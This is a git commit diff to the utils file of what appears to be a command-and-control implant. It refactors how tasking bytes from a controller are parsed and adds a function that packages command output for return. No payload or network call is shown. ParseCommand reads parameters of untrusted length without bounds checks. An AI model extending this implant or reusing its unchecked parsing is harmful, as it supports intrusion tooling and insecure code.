54dd63173aa0542304f2693ab0f2e4b33282a9d7
execute-assembly <155918223+execute-assembly@users.noreply.github.com>
2026-02-24 02:54:33 +0800

    Update utils.cpp

--- implant/utils.cpp
+++ implant/utils.cpp
@@ -9,7 +9,11 @@
 #define BASE_BUFFER_SIZE 256
 
 
+/*
+	TODO
+		move AllocAndLoad, CraftOutput delete rest
 
+*/
 BOOL AllocateAndLoadNeeded() {
 	
 	AuthConf			= AllocMemory<AuthConfig>   (sizeof(AuthConfig));
@@ -67,22 +71,22 @@ BOOL ParseCommandJson(PBYTE CommandString) {
 	*/
 
 	g_Bytes->index = 0;
-	UINT ErrorCodeCheck = g_Bytes->Read4(CommandString);
+	UINT ErrorCodeCheck = g_Bytes->Read4();
 	if (ErrorCodeCheck > 0) {
 		printf("No Command OR ERROR\n");
 		return FALSE;
 	}
 
 
-	CommandInfo->commandID = g_Bytes->Read4(CommandString);
-	CommandInfo->commandCode = g_Bytes->Read4(CommandString);
-	UINT Param1Len = g_Bytes->Read4(CommandString);
+	CommandInfo->commandID = g_Bytes->Read4();
+	CommandInfo->commandCode = g_Bytes->Read4();
+	UINT Param1Len = g_Bytes->Read4();
 	if (Param1Len <= 0) return TRUE;
 
 	if (Param1Len < MAX_PARAM_LENGTH) {
 		CHAR ParamBuffer[MAX_PARAM_LENGTH];
 
-		g_Bytes->ReadBytes(CommandString, (PBYTE)ParamBuffer, Param1Len);
+		g_Bytes->ReadBytes((PBYTE)ParamBuffer, Param1Len);
 
 		if (CommandInfo->param != NULL) {
 			free(CommandInfo->param);
@@ -93,12 +97,12 @@ BOOL ParseCommandJson(PBYTE CommandString) {
 
 
 
-	UINT Param2Len = g_Bytes->Read4(CommandString);
+	UINT Param2Len = g_Bytes->Read4();
 	if (Param2Len <= 0) return TRUE;
 	if (Param2Len < MAX_PARAM_LENGTH) {
 		CHAR Param2Buffer[MAX_PARAM_LENGTH];
 
-		g_Bytes->ReadBytes(CommandString, (PBYTE)Param2Buffer, Param2Len);
+		g_Bytes->ReadBytes((PBYTE)Param2Buffer, Param2Len);
 
 		if (CommandInfo->param2 != NULL) {
 			free(CommandInfo->param2);
@@ -112,6 +116,35 @@ BOOL ParseCommandJson(PBYTE CommandString) {
 	printf("CommandID: %d\nCommandCode %d\nParam 1: %s\nParam 2: %s\n", CommandInfo->commandID, CommandInfo->commandCode, CommandInfo->param, CommandInfo->param2);
 
 	return TRUE;
+
+}
+
+
+BOOL CraftOutput(UINT CommandID, _Out_ PBYTE* Output, PBYTE InData, int DataSize, _Out_ int *FinalSize) {
+	/*
+		[CommandID 4 bytes]
+		[CommandOut Len 4 bytes]
+		[command output N bytes]
+	*/
+	g_Bytes->index = 0;
+
+	INT totalSize = 4 + 4 + DataSize;
+
+	PBYTE OutData = AllocMemory<BYTE>(totalSize);
+	if (OutData == NULL) {
+		*Output = NULL;
+		*FinalSize = 0;
+		return FALSE;
+	}
+	g_Bytes->Write4(OutData, CommandID);
+	g_Bytes->Write4(OutData, DataSize);
+	g_Bytes->WriteBytes(OutData, DataSize, InData);
+
+	*Output = OutData;
+	*FinalSize = totalSize;
+	return TRUE;
+
+
 
 }
 
@@ -150,28 +183,33 @@ BOOL CraftOutputJson(PCHAR CommandID, PCHAR outputData, _Out_ PCHAR* JsonOutput)
 }
 
 
-BOOL ParseCommand(BYTE* data) {
+BOOL ParseCommand(BYTE* data, INT Size) {
 
 	g_Bytes->index = 0;
+	g_Bytes->Set(data, Size);
 
-	UINT ErrorCode = g_Bytes->Read4(data);
+	UINT ErrorCode = g_Bytes->Read4();
+	if (ErrorCode > 0) {
+		printf("Error Node Commande\n");
+		return FALSE;
+	}
 
-	CommandInfo->commandID = g_Bytes->Read4(data);
+	CommandInfo->commandID = g_Bytes->Read4();
 	printf("Code: %d\n", CommandInfo->commandID);
-	CommandInfo->commandCode = g_Bytes->Read4(data);
+	CommandInfo->commandCode = g_Bytes->Read4();
 	printf("ID: %d\n", CommandInfo->commandCode);
 
-	UINT Param1Length = g_Bytes->Read4(data);
+	UINT Param1Length = g_Bytes->Read4();
 	PCHAR Str1 = AllocMemory<CHAR>(Param1Length);
-	g_Bytes->ReadBytes(data, (BYTE*)Str1, Param1Length);
+	g_Bytes->ReadBytes((BYTE*)Str1, Param1Length);
 	CommandInfo->param = _strdup(Str1);
 	printf("param 1: %s\n", CommandInfo->param);
 	HeapFree(GetProcessHeap(), 0, Str1);
 
-	UINT Param2Len = g_Bytes->Read4(data);
+	UINT Param2Len = g_Bytes->Read4();
 
 	PCHAR Str2 = AllocMemory<CHAR>(Param2Len);
-	g_Bytes->ReadBytes(data, (BYTE*)Str2, Param2Len);
+	g_Bytes->ReadBytes((BYTE*)Str2, Param2Len);
 	CommandInfo->param2 = _strdup(Str2);
 	printf("param 2: %s\n", CommandInfo->param2);
 	HeapFree(GetProcessHeap(), 0, Str2);
